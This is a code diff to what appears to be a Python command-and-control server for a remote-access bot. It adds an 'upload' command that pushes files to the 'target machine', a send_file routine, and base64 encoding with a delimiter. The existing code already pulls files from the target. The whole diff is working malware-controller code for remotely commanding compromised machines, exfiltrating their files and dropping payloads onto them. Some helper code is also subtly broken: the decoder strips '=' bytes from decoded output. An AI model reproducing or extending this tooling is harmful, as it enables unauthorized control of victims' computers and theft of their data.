@@ -16,6 +16,20 @@ def base64_decode(data):
     # Remove the padding and return the decoded data
     return base64.b64decode(data).replace(b'=', b'')
 
+def base64_encode(data):
+    """This function encodes data in base64 and adds padding to the end of the string if needed, as well as adding a delimiter to the end of the string
+    Args:
+        data (_type_:bytes): The data to encode
+    Returns:
+        _type_: bytes
+    """
+    
+    delim = b'!!#@'
+    if len(data) % 4 != 0:
+        data += b'=' * (4 - (len(data) % 4))
+    return base64.b64encode(data) + delim
+
+
 def input_validator(input_prompt):
     output = ""
     while output == "":
@@ -33,6 +47,7 @@ def command_input(os_type):
     # Ask the user for a command
     command = ""
     file_name = ""
+    file_destination = ""
     # While loop to make sure the user enters a command
     while command == "":
         command = input(os_type + " > ")
@@ -41,9 +56,13 @@ def command_input(os_type):
             # Ask the user for a file name
             while file_name == "":
                 file_name = input("Enter the file's absolute path> ")
+        elif command.lower() == 'upload':
+            while file_name == "":
+                file_name = input("Enter the file's absolute path> ")
+                file_destination = input("Enter the destination path> ")
             # file_name = input_validator("Enter the file's absolute path> ")
     # Return the command and file name
-    return command, file_name
+    return command, file_name, file_destination
 
 def download_file(socket, file_name, command="download"):
     """This function downloads a file from the target machine
@@ -67,6 +86,37 @@ def download_file(socket, file_name, command="download"):
         with open(file_out_location, 'wb') as f:
             f.write(base64_decode(full_file))
 
+def upload_file(socket, file_name, file_destination, command="upload"):
+    """This function uploads a file to the target machine
+    Args:
+        socket (_type_): The socket to send data to
+        file_name (_type_): The name of the file to upload
+    """
+    # Bot is looking for command in specific format
+    command = command + " " + file_name + " " + file_destination
+    # Send the command to the bot
+    socket.send(command.encode())
+    # Read the file into memory
+    with open(file_name, 'rb') as f:
+        file_data = f.read()
+        file_data = base64_encode(file_data)
+        socket.sendall(file_data)
+    # Encode the file data
+    # TODO: Add error handling for file not found
+
+def send_file(socket, file_name, file_destination, command="upload"):
+    """This function sends a file to the C2 server
+    Args:
+        socket (_type_): The socket to send data to
+        file_name (_type_): The name of the file to send
+    """
+    try:
+        with open(file_name, "rb") as f:
+            data = f.read()
+            data = base64_encode(data)
+            socket.sendall(data)
+    except:
+        socket.sendall(base64_encode(b"[-] File not found"))
 
 def receive_data(socket):
     """This function receives the data from the socket and returns it
@@ -105,13 +155,18 @@ def main():
         os_family = receive_data(client)
         os_family = base64_decode(os_family)
         os_family = os_family.decode()
+        running_directory = receive_data(client)
+        running_directory = base64_decode(running_directory)
+        running_directory = running_directory.decode()
         user_continue = True
         while user_continue:
             # Get the command from the user
-            command, file_name = command_input(os_family)
+            command, file_name, file_destination = command_input(os_family)
             # Check to see if the user entered download menu
-            if file_name != "":
+            if command.lower() == "download":
                 download_file(client, file_name)
+            elif command.lower() == "upload":
+                upload_file(client, file_name, file_destination)
             # Check to see if the user entered quit
             else:
                 client.send(command.encode())
